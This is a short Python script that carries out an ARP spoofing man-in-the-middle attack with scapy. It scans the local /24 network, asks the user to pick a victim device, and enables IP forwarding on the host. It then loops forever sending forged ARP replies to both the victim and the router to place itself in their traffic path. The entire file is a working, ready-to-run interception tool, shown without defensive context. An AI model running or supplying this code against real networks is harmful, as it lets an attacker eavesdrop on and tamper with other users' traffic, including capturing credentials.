import scapy.all as scapy
from time import sleep

class ArpMITM:
    def __init__(self):
        pass

    def run(self, target_router_ip):
        client_ip, client_mac, router_ip, router_mac  = self.scan(target_router_ip)

        #Allows forwarding
        with open("/proc/sys/net/ipv4/ip_forward", 'w') as export:
            export.write(str(1))
        
        #starts sending packages
        self.arp_mitm(client_ip, client_mac, router_ip, router_mac)

    def arp_mitm(self, client_ip, client_mac, router_ip, router_mac):
        """
        Sends false packet to get in the middle
        """


        while True:
            packet = scapy.ARP(op = 2, pdst = client_ip, hwdst=client_mac, psrc=router_ip)
            scapy.send(packet, verbose = False)
            packet = scapy.ARP(op = 2, pdst = router_ip, hwdst=router_mac, psrc=client_ip)
            scapy.send(packet, verbose = False)
            sleep(2)

    def scan(self, target_router_ip):
        """
        Arp scan on the network to find a target
        """
        range = target_router_ip+"/24"
        ans, unans = scapy.arping(range)
        
        for index, device in enumerate(ans) : 
            if device[1][scapy.ARP].psrc == target_router_ip:
                target_router_mac = device[1][scapy.ARP].hwsrc
            else : 
                print("Device {}, IP : {}, MAC : {}".format(index, device[1][scapy.ARP].psrc, device[1][scapy.ARP].hwsrc))
        idx = int(input("Which device to select ?"))
        target_client_ip = ans[idx][1][scapy.ARP].psrc
        target_client_mac = ans[idx][1][scapy.ARP].hwsrc
        
        print("Selected target : {}".format(target_client_ip), end="")
        return target_client_ip, target_client_mac, target_router_ip, target_router_mac

if __name__=="__main__":
    mitm = ArpMITM()
    mitm.run("192.168.0.1")
